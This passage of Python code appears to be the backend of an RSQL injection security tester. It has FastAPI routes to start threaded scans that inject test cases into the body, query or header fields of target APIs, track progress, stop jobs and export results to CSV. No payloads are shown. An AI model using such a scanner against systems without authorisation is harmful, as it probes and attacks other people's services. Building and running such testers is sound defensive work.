                end = time.time() + delay_sec
                while time.time() < end and not job.get("stopped"):
                    time.sleep(min(0.1, end - time.time()))

        if job.get("stopped"):
            break

    # Store full results for export / UI
    job["_all_results"] = results
    job.update({
        "status"  : "done",
        "aborted" : bool(job.get("stopped")),
        "progress": 100,
        "elapsed" : round(time.time() - t0, 1),
        "pass_n"  : pass_n,
        "vuln_n"  : vuln_n,
        "warn_n"  : warn_n,
        "err_n"   : err_n,
    })


# ── Pydantic models ───────────────────────────────────────────────────────────

class EntryModel(BaseModel):
    method:    str = "GET"
    url:       str
    headers:   dict = {}
    body:      Optional[Any]  = None  # dict, list, or string — accept all
    body_type: Optional[str]  = None
    query:     dict = {}

class ScanRequest(BaseModel):
    entries:        List[EntryModel]
    token:          str = ""
    body_fields:    List[str] = []
    query_fields:   List[str] = []
    inject_headers: bool = False
    categories:     List[str] = []
    delay_sec:      float = 0.0


# ── API Routes ────────────────────────────────────────────────────────────────

@app.get("/")
def root():
    return {"status": "RSQL Security Tester Backend running", "port": 8774}


@app.get("/rsql/datasets")
def get_datasets():
    return {
        k: {
            "label":  v["label"],
            "hint":   v["hint"],
            "icon":   v["icon"],
            "count":  len(v["cases"]),
        }
        for k, v in RSQL_DATASETS.items()
    }


@app.post("/rsql/scan")
async def start_scan(req: ScanRequest):
    if not req_lib:
        raise HTTPException(500, "requests library not available")
    if not req.entries:
        raise HTTPException(400, "At least one entry is required")
    if not req.categories:
        raise HTTPException(400, "At least one category is required")
    if not req.body_fields and not req.query_fields and not req.inject_headers:
        raise HTTPException(400, "At least one injection target is required")
    # One scan at a time — avoid overlapping jobs hammering the target
    if any(j.get("status") == "scanning" for j in jobs.values()):
        raise HTTPException(
            409,
            "A scan is already in progress. Stop it or wait for it to finish.",
        )

    token = req.token.strip()
    if token and not token.lower().startswith(("bearer ", "basic ", "token ")):
        if token.startswith("eyJ"):
            token = f"Bearer {token}"

    plan_len = len(build_test_plan(
        req.body_fields, req.query_fields, req.inject_headers, req.categories
    ))
    grand_total = plan_len * len(req.entries)

    job_id = str(uuid.uuid4())[:8]
    jobs[job_id] = {
        "status":            "scanning",
        "progress":          0,
        "completed":         0,
        "total":             grand_total,
        "results":           [],
        "all_results_count": 0,
        "elapsed":           0,
        "aborted":           False,
        "pass_n": 0, "vuln_n": 0, "warn_n": 0, "err_n": 0,
        "_all_results":      [],
    }

    entries_plain = [e.dict() for e in req.entries]
    delay_sec = max(0.0, min(float(req.delay_sec or 0), 10.0))
    threading.Thread(
        target=_run_scan,
        args=(job_id, entries_plain, token,
              req.body_fields, req.query_fields, req.inject_headers, req.categories,
              delay_sec),
        daemon=True,
    ).start()

    return {"job_id": job_id, "total": grand_total}


@app.get("/rsql/progress/{job_id}")
def get_progress(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    return {
        "status":    job["status"],
        "progress":  job["progress"],
        "completed": job["completed"],
        "total":     job["total"],
        "results":   job["results"],          # last 200 (light)
        "all_count": job["all_results_count"],
        "elapsed":   job["elapsed"],
        "aborted":   bool(job.get("aborted") or job.get("stopped")),
        "pass_n":    job["pass_n"],
        "vuln_n":    job["vuln_n"],
        "warn_n":    job["warn_n"],
        "err_n":     job["err_n"],
    }


@app.post("/rsql/stop/{job_id}")
def stop_scan(job_id: str):
    job = jobs.get(job_id)
    if job:
        job["stopped"] = True
    return {"ok": True}


@app.get("/rsql/results/{job_id}")
def get_full_results(job_id: str):
    """Return ALL results for export (not just last 200)."""
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")
    return {
        "results": job.get("_all_results", job.get("results", [])),
        "pass_n":  job["pass_n"],
        "vuln_n":  job["vuln_n"],
        "warn_n":  job["warn_n"],
        "err_n":   job["err_n"],
        "elapsed": job["elapsed"],
        "total":   job["total"],
        "status":  job["status"],
        "aborted": bool(job.get("aborted") or job.get("stopped")),
    }


@app.get("/rsql/csv/{job_id}")
def download_csv(job_id: str):
    job = jobs.get(job_id)
    if not job:
        raise HTTPException(404, "Job not found")

    results = job.get("_all_results", job.get("results", []))
    buf = io.StringIO()
    w   = csv.writer(buf, quoting=csv.QUOTE_ALL)
    _IL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f]")

    def safe(v):
        return _IL.sub("", str(v) if v is not None else "null")

    fields = [
        ("api_url",      "API URL"),
        ("inject_type",  "Inject Type"),
        ("field",        "Field / Header"),
        ("category",     "Attack Category"),
        ("case_id",      "Case ID"),
        ("case_desc",    "Description"),
        ("test_value",   "Payload Sent"),
        ("status_code",  "HTTP Status"),
        ("result",       "Result"),
        ("elapsed_ms",   "Response Time (ms)"),
        ("request_body", "Request Body Sent"),
        ("response",     "Response Body"),
    ]
    w.writerow([h for _, h in fields])
    for r in results:
        w.writerow([safe(r.get(k, "")) for k, _ in fields])

    buf.seek(0)
    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": "attachment; filename=rsql_security_report.csv"},
    )
